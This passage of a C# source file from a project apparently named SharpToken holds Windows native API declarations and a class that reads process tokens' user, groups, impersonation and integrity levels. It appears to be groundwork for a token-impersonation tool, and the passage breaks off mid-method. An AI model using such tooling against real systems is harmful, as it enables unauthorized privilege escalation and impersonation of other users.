using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Security.Permissions;
using System.Security.Principal;
using System.Text;

namespace SharpToken
{

    public enum IntegrityLevel : uint
    {
        Untrusted,
        LowIntegrity = 0x00001000,
        MediumIntegrity = 0x00002000,
        MediumHighIntegrity = 0x100 + MediumIntegrity,
        HighIntegrity = 0X00003000,
        SystemIntegrity = 0x00004000,
        ProtectedProcess = 0x00005000
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_ACCESS_TOKEN
    {
        public IntPtr Token;
        public IntPtr Thread;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr pSecurityDescriptor;
        public bool bInheritHandle;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_MANDATORY_LABEL
    {

        public SID_AND_ATTRIBUTES Label;

    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct TOKEN_GROUPS
    {
        public uint GroupCount;

        public SID_AND_ATTRIBUTES Groups;
    }


    [StructLayout(LayoutKind.Sequential)]
    public struct SID_AND_ATTRIBUTES
    {
        public IntPtr Sid;
        public uint Attributes;
    }


    [Flags]
    public enum ProcessCreateFlags : uint
    {
        DEBUG_PROCESS = 0x00000001,
        DEBUG_ONLY_THIS_PROCESS = 0x00000002,
        CREATE_SUSPENDED = 0x00000004,
        DETACHED_PROCESS = 0x00000008,
        CREATE_NEW_CONSOLE = 0x00000010,
        NORMAL_PRIORITY_CLASS = 0x00000020,
        IDLE_PRIORITY_CLASS = 0x00000040,
        HIGH_PRIORITY_CLASS = 0x00000080,
        REALTIME_PRIORITY_CLASS = 0x00000100,
        CREATE_NEW_PROCESS_GROUP = 0x00000200,
        CREATE_UNICODE_ENVIRONMENT = 0x00000400,
        CREATE_SEPARATE_WOW_VDM = 0x00000800,
        CREATE_SHARED_WOW_VDM = 0x00001000,
        CREATE_FORCEDOS = 0x00002000,
        BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,
        ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,
        INHERIT_PARENT_AFFINITY = 0x00010000,
        INHERIT_CALLER_PRIORITY = 0x00020000,
        CREATE_PROTECTED_PROCESS = 0x00040000,
        EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
        PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,
        PROCESS_MODE_BACKGROUND_END = 0x00200000,
        CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
        CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
        CREATE_DEFAULT_ERROR_MODE = 0x04000000,
        CREATE_NO_WINDOW = 0x08000000,
        PROFILE_USER = 0x10000000,
        PROFILE_KERNEL = 0x20000000,
        PROFILE_SERVER = 0x40000000,
        CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000,
    }

    public enum PROCESS_INFORMATION_CLASS
    {
        ProcessBasicInformation,
        ProcessQuotaLimits,
        ProcessIoCounters,
        ProcessVmCounters,
        ProcessTimes,
        ProcessBasePriority,
        ProcessRaisePriority,
        ProcessDebugPort,
        ProcessExceptionPort,
        ProcessAccessToken,
        ProcessLdtInformation,
        ProcessLdtSize,
        ProcessDefaultHardErrorMode,
        ProcessIoPortHandlers,
        ProcessPooledUsageAndLimits,
        ProcessWorkingSetWatch,
        ProcessUserModeIOPL,
        ProcessEnableAlignmentFaultFixup,
        ProcessPriorityClass,
        ProcessWx86Information,
        ProcessHandleCount,
        ProcessAffinityMask,
        ProcessPriorityBoost,
        MaxProcessInfoClass


    }

    [Flags]
    public enum ProcessAccessFlags : uint
    {
        All = 0x001F0FFF,
        Terminate = 0x00000001,
        CreateThread = 0x00000002,
        VirtualMemoryOperation = 0x00000008,
        VirtualMemoryRead = 0x00000010,
        VirtualMemoryWrite = 0x00000020,
        DuplicateHandle = 0x00000040,
        CreateProcess = 0x000000080,
        SetQuota = 0x00000100,
        SetInformation = 0x00000200,
        QueryInformation = 0x00000400,
        QueryLimitedInformation = 0x00001000,
        Synchronize = 0x00100000
    }
    public enum TOKEN_ELEVATION_TYPE
    {
        TokenElevationTypeDefault = 1,
        TokenElevationTypeFull,
        TokenElevationTypeLimited
    }
    public enum TOKEN_INFORMATION_CLASS
    {
        TokenUser = 1,
        TokenGroups,
        TokenPrivileges,
        TokenOwner,
        TokenPrimaryGroup,
        TokenDefaultDacl,
        TokenSource,
        TokenType,
        TokenImpersonationLevel,
        TokenStatistics,
        TokenRestrictedSids,
        TokenSessionId,
        TokenGroupsAndPrivileges,
        TokenSessionReference,
        TokenSandBoxInert,
        TokenAuditPolicy,
        TokenOrigin,
        TokenElevationType,
        TokenLinkedToken,
        TokenElevation,
        TokenHasRestrictions,
        TokenAccessInformation,
        TokenVirtualizationAllowed,
        TokenVirtualizationEnabled,
        TokenIntegrityLevel,
        TokenUIAccess,
        TokenMandatoryPolicy,
        TokenLogonSid,
        TokenIsAppContainer,
        TokenCapabilities,
        TokenAppContainerSid,
        TokenAppContainerNumber,
        TokenUserClaimAttributes,
        TokenDeviceClaimAttributes,
        TokenRestrictedUserClaimAttributes,
        TokenRestrictedDeviceClaimAttributes,
        TokenDeviceGroups,
        TokenRestrictedDeviceGroups,
        TokenSecurityAttributes,
        TokenIsRestricted,
        TokenProcessTrustLevel,
        TokenPrivateNameSpace,
        TokenSingletonAttributes,
        TokenBnoIsolation,
        TokenChildProcessFlags,
        TokenIsLessPrivilegedAppContainer,
        TokenIsSandboxed,
        MaxTokenInfoClass
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID
    {
        public int LowPart;

        public int HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public class TokenPrivileges
    {
        public int PrivilegeCount = 1;

        public LUID Luid;

        public int Attributes;
    }
    public enum SECURITY_LOGON_TYPE : uint
    {
        UndefinedLogonType = 0,
        Interactive = 2,
        Network,
        Batch,
        Service,
        Proxy,
        Unlock,
        NetworkCleartext,
        NewCredentials,
        RemoteInteractive,
        CachedInteractive,
        CachedRemoteInteractive,
        CachedUnlock
    }
    public enum TOKEN_TYPE
    {
        UnKnown = -1,
        TokenPrimary = 1,
        TokenImpersonation
    }
    public enum OBJECT_INFORMATION_CLASS
    {
        ObjectBasicInformation,
        ObjectNameInformation,
        ObjectTypeInformation,
        ObjectAllTypesInformation,
        ObjectHandleInformation
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct OBJECT_TYPE_INFORMATION
    { // Information Class 2
        public UNICODE_STRING Name;
        public int ObjectCount;
        public int HandleCount;
        public int Reserved1;
        public int Reserved2;
        public int Reserved3;
        public int Reserved4;
        public int PeakObjectCount;
        public int PeakHandleCount;
        public int Reserved5;
        public int Reserved6;
        public int Reserved7;
        public int Reserved8;
        public int InvalidAttributes;
        public GENERIC_MAPPING GenericMapping;
        public int ValidAccess;
        public byte Unknown;
        public byte MaintainHandleDatabase;
        public int PoolType;
        public int PagedPoolUsage;
        public int NonPagedPoolUsage;
    }
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct SECURITY_LOGON_SESSION_DATA
    {
        public uint Size;

        public LUID LogonId;

        public UNICODE_STRING UserName;

        public UNICODE_STRING LogonDomain;

        public UNICODE_STRING AuthenticationPackage;

        public uint LogonType;

        public uint Session;

        public IntPtr Sid;

        public long LogonTime;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct GENERIC_MAPPING
    {
        public int GenericRead;
        public int GenericWrite;
        public int GenericExecute;
        public int GenericAll;
    }
    public class NativeMethod
    {
        public static readonly uint HANDLE_FLAG_INHERIT = 0x00000001;
        public static readonly uint HANDLE_FLAG_PROTECT_FROM_CLOSE = 0x00000002;
        public static readonly uint SystemExtendedHandleInformation = 0x40;
        public static readonly uint STATUS_SUCCESS = 0x00000000;
        public static readonly uint ERROR_SUCCESS = 0x00000000;
        public static readonly uint STATUS_INFO_LENGTH_MISMATCH = 0xc0000004;
        public static readonly uint STATUS_BUFFER_OVERFLOW = 0x80000005;
        public static readonly uint DUPLICATE_SAME_ACCESS = 0x00000002;
        public static readonly uint MAXIMUM_ALLOWED = 0x02000000;
        public static uint STANDARD_RIGHTS_REQUIRED = 0x000F0000;
        public static uint TOKEN_ASSIGN_PRIMARY = 0x0001;
        public static uint TOKEN_DUPLICATE = 0x0002;
        public static uint TOKEN_IMPERSONATE = 0x0004;
        public static uint TOKEN_QUERY = 0x0008;
        public static uint TOKEN_QUERY_SOURCE = 0x0010;
        public static uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
        public static uint TOKEN_ADJUST_GROUPS = 0x0040;
        public static uint TOKEN_ADJUST_DEFAULT = 0x0080;
        public static uint TOKEN_ADJUST_SESSIONID = 0x0100;

        public static uint STARTF_FORCEONFEEDBACK = 0x00000040;
        public static uint STARTF_FORCEOFFFEEDBACK = 0x00000080;
        public static uint STARTF_PREVENTPINNING = 0x00002000;
        public static uint STARTF_RUNFULLSCREEN = 0x00000020;
        public static uint STARTF_TITLEISAPPID = 0x00001000;
        public static uint STARTF_TITLEISLINKNAME = 0x00000800;
        public static uint STARTF_UNTRUSTEDSOURCE = 0x00008000;
        public static uint STARTF_USECOUNTCHARS = 0x00000008;
        public static uint STARTF_USEFILLATTRIBUTE = 0x00000010;
        public static uint STARTF_USEHOTKEY = 0x00000200;
        public static uint STARTF_USEPOSITION = 0x00000004;
        public static uint STARTF_USESHOWWINDOW = 0x00000001;
        public static uint STARTF_USESIZE = 0x00000002;
        public static uint STARTF_USESTDHANDLES = 0x00000100;



        public static uint GENERIC_READ = 0x80000000;
        public static uint GENERIC_WRITE = 0x40000000;
        public static uint GENERIC_EXECUTE = 0x20000000;
        public static uint GENERIC_ALL = 0x10000000;





        public static uint TOKEN_ELEVATION = TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID;
        public static uint TOKEN_ALL_ACCESS_P = STANDARD_RIGHTS_REQUIRED |
                          TOKEN_ASSIGN_PRIMARY |
                          TOKEN_DUPLICATE |
                          TOKEN_IMPERSONATE |
                          TOKEN_QUERY |
                          TOKEN_QUERY_SOURCE |
                          TOKEN_ADJUST_PRIVILEGES |
                          TOKEN_ADJUST_GROUPS |
                          TOKEN_ADJUST_DEFAULT;


        public static readonly int SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x00000001;
        public static readonly int SE_PRIVILEGE_ENABLED = 0x00000002;
        public static readonly int SE_PRIVILEGE_REMOVED = 0X00000004;

        public static readonly int NMPWAIT_WAIT_FOREVER = unchecked((int)0xffffffff);
        public static readonly int NMPWAIT_NOWAIT = 0x00000001;
        public static readonly int NMPWAIT_USE_DEFAULT_WAIT = 0x00000000;

        public static readonly int PIPE_UNLIMITED_INSTANCES = 255;

        public static readonly int PIPE_WAIT = 0x00000000;
        public static readonly int PIPE_NOWAIT = 0x00000001;
        public static readonly int PIPE_READMODE_BYTE = 0x00000000;
        public static readonly int PIPE_READMODE_MESSAGE = 0x00000002;
        public static readonly int PIPE_TYPE_BYTE = 0x00000000;
        public static readonly int PIPE_TYPE_MESSAGE = 0x00000004;
        public static readonly int PIPE_ACCEPT_REMOTE_CLIENTS = 0x00000000;
        public static readonly int PIPE_REJECT_REMOTE_CLIENTS = 0x00000008;

        public static readonly int PIPE_ACCESS_INBOUND = 0x00000001;
        public static readonly int PIPE_ACCESS_OUTBOUND = 0x00000002;
        public static readonly int PIPE_ACCESS_DUPLEX = 0x00000003;

        public static IntPtr ContextToken = IntPtr.Zero;

        public static IntPtr BAD_HANLE = new IntPtr(-1);

        [DllImport("ntdll")]
        public static extern uint NtQuerySystemInformation(
        [In] uint SystemInformationClass,
        [In] IntPtr SystemInformation,
        [In] uint SystemInformationLength,
        [Out] out uint ReturnLength);
        [DllImport("ntdll")]
        public static extern uint NtDuplicateObject(
        [In] IntPtr SourceProcessHandle,
        [In] IntPtr SourceHandle,
        [In] IntPtr TargetProcessHandle,
        [In] IntPtr PHANDLE,
        [In] int DesiredAccess,
        [In] int Attributes,
        [In] int Options);

        [DllImport("ntdll", SetLastError = true)]
        public static extern uint NtQueryObject(
        [In] IntPtr Handle,
        [In] OBJECT_INFORMATION_CLASS ObjectInformationClass,
        IntPtr ObjectInformation,
        [In] int ObjectInformationLength,
        out int ReturnLength);
        [DllImport("ntdll", SetLastError = true)]
        public static extern uint NtSuspendProcess([In] IntPtr Handle);

        [DllImport("ntdll.dll", SetLastError = false)]
        public static extern uint NtResumeProcess(IntPtr ProcessHandle);

        [DllImport("ntdll", SetLastError = true)]
        public static extern uint NtTerminateProcess(
  [In] IntPtr ProcessHandle,
  [In] uint ExitStatus);



        [DllImport("ntdll", SetLastError = true)]
        public static extern uint NtSetInformationProcess(

  [In] IntPtr ProcessHandle,
  [In] PROCESS_INFORMATION_CLASS ProcessInformationClass,
  [In] IntPtr ProcessInformation,
  [In] uint ProcessInformationLength);

        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
        [DllImport("secur32.dll", SetLastError = true)]
        internal static extern int LsaFreeReturnBuffer(IntPtr handle);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool PeekNamedPipe(IntPtr handle,
            byte[] buffer, uint nBufferSize, ref uint bytesRead,
            ref uint bytesAvail, ref uint BytesLeftThisMessage);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern IntPtr GetSidSubAuthority(IntPtr pSid, uint nSubAuthority);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern IntPtr GetSidSubAuthorityCount(IntPtr pSid);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool IsTokenRestricted(IntPtr TokenHandle);
        [DllImport("kernel32")]
        public static extern void CloseHandle(IntPtr hObject);
        [DllImport("kernel32")]
        public static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        public static extern void SetLastError(uint dwErrCode);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, int nSize);
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern bool CreateProcessW([In] string lpApplicationName, [In][Out] string lpCommandLine, [In] IntPtr lpProcessAttributes, [In] IntPtr lpThreadAttributes, [In] bool bInheritHandles, [In] uint dwCreationFlags, [In] IntPtr lpEnvironment, [In] string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, [Out] out PROCESS_INFORMATION lpProcessInformation);
        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessAsUserW(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, [MarshalAs(UnmanagedType.LPWStr)] string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessWithTokenW(IntPtr hToken, uint dwLogonFlags, string lpApplicationName, string lpCommandLine, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        [DllImport("advapi32", SetLastError = true)]
        public static extern bool GetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation, uint TokenInformationLength, out uint ReturnLength);
        [DllImport("Kernel32", SetLastError = true)]
        public static extern bool SetHandleInformation(IntPtr TokenHandle, uint dwMask, uint dwFlags);

        [DllImport("wtsapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int WTSConnectSession(int targetSessionId, int sourceSessionId, string password, bool wait);

        [DllImport("kernel32.dll")]
        public static extern int WTSGetActiveConsoleSessionId();

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
        ProcessAccessFlags processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool DuplicateHandle(
  [In] IntPtr hSourceProcessHandle,
  [In] IntPtr hSourceHandle,
  [In] IntPtr hTargetProcessHandle,
  out IntPtr lpTargetHandle,
  [In] uint dwDesiredAccess,
  [In] bool bInheritHandle,
  [In] uint dwOptions
);
        [DllImport("secur32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        internal static extern uint LsaGetLogonSessionData([In] ref LUID LogonId, [In][Out] ref IntPtr ppLogonSessionData);
        [DllImport("advapi32.dll", BestFitMapping = false, CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool LookupPrivilegeValue([MarshalAs(UnmanagedType.LPTStr)] string lpSystemName, [MarshalAs(UnmanagedType.LPTStr)] string lpName, out LUID lpLuid);
        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, TokenPrivileges NewState, int BufferLength, IntPtr PreviousState, out int ReturnLength);
        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);
        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
        [DllImport("advapi32.dll", SetLastError = true, EntryPoint = "RevertToSelf")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool RevertToSelfEx();
        [DllImport("kernel32.dll", BestFitMapping = false, CharSet = CharSet.Unicode, EntryPoint = "CreateNamedPipeW", SetLastError = true)]
        public static extern IntPtr CreateNamedPipe(string pipeName, int openMode, int pipeMode, int maxInstances, int outBufferSize, int inBufferSize, int defaultTimeout, ref SECURITY_ATTRIBUTES securityAttributes);
        [DllImport("kernel32.dll", BestFitMapping = false, CharSet = CharSet.Unicode, EntryPoint = "CreateFileW", SetLastError = true)]
        public static extern IntPtr CreateFileW(string lpFileName, int dwDesiredAccess, FileShare dwShareMode, ref SECURITY_ATTRIBUTES secAttrs, FileMode dwCreationDisposition, int dwFlagsAndAttributes, IntPtr hTemplateFile);
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ConnectNamedPipe(IntPtr handle, IntPtr overlapped);
        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);
        [DllImport("psapi.dll", BestFitMapping = false, CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int GetModuleFileNameEx(IntPtr processHandle, IntPtr moduleHandle, StringBuilder baseName, int size);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true, EntryPoint = "DuplicateTokenEx")]
        private extern static bool DuplicateTokenExInternal(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, TOKEN_TYPE TokenType, out IntPtr phNewToken);
        public static bool GetTokenInformation(IntPtr tokenHandle, TOKEN_INFORMATION_CLASS tokenInformationClass, out IntPtr TokenInformation, out uint dwLength)
        {

            bool status = GetTokenInformation(tokenHandle, tokenInformationClass, IntPtr.Zero, 0, out dwLength);

            if (dwLength == 0xfffffff8)
            {
                dwLength = 0;
                goto failRet;
            }

            TokenInformation = Marshal.AllocHGlobal((int)dwLength);
            if (GetTokenInformation(tokenHandle, tokenInformationClass, TokenInformation, dwLength, out dwLength))
            {
                return true;
            }
        failRet:
            dwLength = 0;
            TokenInformation = IntPtr.Zero;
            return false;
        }

        public static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess,
            IntPtr lpTokenAttributes, TokenImpersonationLevel impersonationLevel, TOKEN_TYPE TokenType,
            out IntPtr phNewToken)
        {
            impersonationLevel -= TokenImpersonationLevel.Anonymous;
            return DuplicateTokenExInternal(hExistingToken, dwDesiredAccess, lpTokenAttributes, (uint)impersonationLevel,
                 TokenType, out phNewToken);
        }

        public static bool RevertToSelf()
        {
            bool isOk = RevertToSelfEx();
            if (ContextToken != IntPtr.Zero)
            {
                isOk = ImpersonateLoggedOnUser(ContextToken);
            }

            return isOk;
        }
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct TOKEN_STATISTICS
    {

        public LUID TokenId;

        public LUID AuthenticationId;

        public long ExpirationTime;

        public uint TokenType;

        public uint ImpersonationLevel;

        public uint DynamicCharged;

        public uint DynamicAvailable;

        public uint GroupCount;

        public uint PrivilegeCount;

        public LUID ModifiedId;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
        public Int32 cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct _SYSTEM_HANDLE_INFORMATION_EX
    {
        private static int TypeSize = Marshal.SizeOf(typeof(_SYSTEM_HANDLE_INFORMATION_EX));
        public IntPtr NumberOfHandles;
        public IntPtr Reserved;


        public uint GetNumberOfHandles()
        {
            return (uint)NumberOfHandles.ToInt64();
        }
        public static SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX HandleAt(IntPtr handleInfoPtr, ulong index)
        {
            IntPtr thisPtr = new IntPtr(handleInfoPtr.ToInt64());
            thisPtr = new IntPtr(thisPtr.ToInt64() + TypeSize + Marshal.SizeOf(typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX)) * (int)index);

            return (SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX)Marshal.PtrToStructure(thisPtr, typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX));

        }
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct UNICODE_STRING : IDisposable
    {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr buffer;

        [SecurityPermission(SecurityAction.LinkDemand)]
        public void Initialize(string s)
        {
            Length = (ushort)(s.Length * 2);
            MaximumLength = (ushort)(Length + 2);
            buffer = Marshal.StringToHGlobalUni(s);
        }

        [SecurityPermission(SecurityAction.LinkDemand)]
        public void Dispose()
        {
            Marshal.FreeHGlobal(buffer);
            buffer = IntPtr.Zero;
        }
        [SecurityPermission(SecurityAction.LinkDemand)]
        public override string ToString()
        {
            if (Length == 0)
                return String.Empty;
            return Marshal.PtrToStringUni(buffer, Length / 2);
        }
    }

    public class ProcessToken
    {
        public string SID { get; set; }
        public string LogonDomain { get; set; }
        public string UserName { get; set; }
        public uint Session { get; set; }
        public SECURITY_LOGON_TYPE LogonType { get; set; }
        public TOKEN_TYPE TokenType { get; set; }
        public IntPtr TokenHandle { get; set; }
        public int TargetProcessId { get; set; }
        public IntPtr TargetProcessToken { get; set; }
        public TokenImpersonationLevel ImpersonationLevel { get; set; }
        public string AuthenticationType { get; set; }
        public string TargetProcessExePath { get; set; }
        public TOKEN_ELEVATION_TYPE TokenElevationType { get; set; }
        public IntegrityLevel IntegrityLevel { get; set; }
        public bool IsRestricted { get; set; }
        public bool TokenUIAccess { get; set; }

        public string Groups { get; set; }

        public bool IsClose { get; private set; }

        private static readonly List<string> blackGroupSid = new List<string>();

        private ProcessToken()
        {

        }


        public static ProcessToken Cast(IntPtr targetProcessToken, int targetProcessPid, IntPtr targetProcessHandle, IntPtr tokenHandle)
        {
            try
            {
                return _Cast(targetProcessToken, targetProcessPid, targetProcessHandle, tokenHandle);
            }
            catch (Exception)
            {

                return null;
            }

        }
        private static ProcessToken _Cast(IntPtr targetProcessToken, int targetProcessPid, IntPtr targetProcessHandle, IntPtr tokenHandle)
        {
            ProcessToken processToken = new ProcessToken();
            SecurityIdentifier securityIdentifier = GetUser(tokenHandle);

            if (securityIdentifier == null)
            {
                return null;
            }

            processToken.UserName = securityIdentifier.Translate(typeof(NTAccount)).Value;
            processToken.SID = securityIdentifier.Value;
            processToken.Groups = string.Join(",", getGoups(tokenHandle));
            processToken.ImpersonationLevel = GetImpersonationLevel(tokenHandle);
            uint session = 0;
            SECURITY_LOGON_TYPE logonType = SECURITY_LOGON_TYPE.UndefinedLogonType;
            string logonDomain = "";

            processToken.AuthenticationType = GetAuthenticationType(tokenHandle, out session, out logonDomain, out logonType);
            processToken.Session = session;
            processToken.LogonType = logonType;
            processToken.LogonDomain = logonDomain;

            processToken.TargetProcessId = targetProcessPid;
            processToken.TargetProcessToken = targetProcessToken;

            //获取Token类型
            processToken.TokenType = GetTokenType(tokenHandle);

            //检查token类型是否为主Token 如果是主Token必须调用DuplicateTokenEx获取模拟Token不然就获取不到Token类型 详情:https://docs.microsoft.com/en-us/windows/win32/api/winnt/ne-winnt-token_information_class
            if (processToken.ImpersonationLevel == TokenImpersonationLevel.None)
            {
                IntPtr newToken;
                if (NativeMethod.DuplicateTokenEx(tokenHandle, NativeMethod.TOKEN_ELEVATION, IntPtr.Zero,
                        TokenImpersonationLevel.Delegation, TOKEN_TYPE.TokenImpersonation, out newToken))
                {
                    processToken.ImpersonationLevel = TokenImpersonationLevel.Delegation;
                    NativeMethod.CloseHandle(newToken);
                }
                else if (NativeMethod.DuplicateTokenEx(tokenHandle, NativeMethod.TOKEN_ELEVATION, IntPtr.Zero,
                    TokenImpersonationLevel.Impersonation, TOKEN_TYPE.TokenImpersonation, out newToken))
                {
                    processToken.ImpersonationLevel = TokenImpersonationLevel.Impersonation;
                    NativeMethod.CloseHandle(newToken);
                }
            }

            processToken.TokenElevationType = GetTokenElevationType(tokenHandle);
            processToken.IntegrityLevel = GetTokenIntegrityLevel(tokenHandle);
            processToken.IsRestricted = NativeMethod.IsTokenRestricted(tokenHandle);
            processToken.TokenUIAccess = GetTokenUIAccess(tokenHandle);
            if (targetProcessHandle != IntPtr.Zero)
            {
                StringBuilder exePath = new StringBuilder(1024);
                NativeMethod.GetModuleFileNameEx(targetProcessHandle, IntPtr.Zero, exePath, exePath.Capacity * 2);
                processToken.TargetProcessExePath = exePath.ToString();
            }

            processToken.TokenHandle = tokenHandle;
            return processToken;
        }

        public static SecurityIdentifier GetUser(IntPtr tokenHandle)
        {
            uint ReturnLength;
            IntPtr tokenUserPtr = IntPtr.Zero;
            SecurityIdentifier securityIdentifier = null;
            if (NativeMethod.GetTokenInformation(tokenHandle, TOKEN_INFORMATION_CLASS.TokenUser, out tokenUserPtr, out ReturnLength))
            {
                securityIdentifier = new SecurityIdentifier(Marshal.ReadIntPtr(tokenUserPtr));
                Marshal.FreeHGlobal(tokenUserPtr);
            }
            return securityIdentifier;
        }

        public static string[] getGoups(IntPtr tokenHandle)
        {
            List<string> goups = new List<string>();
            IntPtr tokenUserPtr = IntPtr.Zero;
            SecurityIdentifier securityIdentifier = null;
            uint ReturnLength;
            /**
             *
             * typedef struct _TOKEN_GROUPS {
                DWORD GroupCount;
            #ifdef MIDL_PASS
                [size_is(GroupCount)] SID_AND_ATTRIBUTES Groups[*];
            #else // MIDL_PASS
                SID_AND_ATTRIBUTES Groups[ANYSIZE_ARRAY];
            #endif // MIDL_PASS
            } TOKEN_GROUPS, *PTOKEN_GROUPS;
             *
             */
            if (NativeMethod.GetTokenInformation(tokenHandle, TOKEN_INFORMATION_CLASS.TokenGroups, out tokenUserPtr, out ReturnLength))
            {
                int offset = 0;
                int groupCount = Marshal.ReadInt32(tokenUserPtr);
                offset += Marshal.SizeOf(typeof(TOKEN_GROUPS)) - Marshal.SizeOf(typeof(SID_AND_ATTRIBUTES));

                for (int i = 0; i < groupCount; i++)
                {
                    lock (blackGroupSid)
                    {
                        try
                        {
                            securityIdentifier = new SecurityIdentifier(Marshal.ReadIntPtr(new IntPtr(tokenUserPtr.ToInt64() + offset)));
                            offset += Marshal.SizeOf(typeof(SID_AND_ATTRIBUTES));

                            if (blackGroupSid.Contains(securityIdentifier.Value))
                            {
                                continue;
                            }

                            goups.Add(securityIdentifier.Translate(typeof(NTAccount)).Value);
                        }
                        catch (Exception e)
                        {
                            if (securityIdentifier != null)
                            {
                                blackGroupSid.Add(securityIdentifier.Value);
                            }

                            continue;
                        }
                    }
                }
                Marshal.FreeHGlobal(tokenUserPtr);
            }
            return goups.ToArray();
        }

        public static TOKEN_TYPE GetTokenType(IntPtr tokenHandle)
        {
            IntPtr tokenTypePtr = IntPtr.Zero;
            uint outLength = 0;
            TOKEN_TYPE ret = TOKEN_TYPE.UnKnown;
            if (NativeMethod.GetTokenInformation(tokenHandle, TOKEN_INFORMATION_CLASS.TokenType, out tokenTypePtr, out outLength))
            {
                ret = (TOKEN_TYPE)(int)Marshal.PtrToStructure(tokenTypePtr, typeof(int));
                Marshal.FreeHGlobal(tokenTypePtr);
            }
            return ret;
        }
        public static TOKEN_ELEVATION_TYPE GetTokenElevationType(IntPtr tokenHandle)
        {
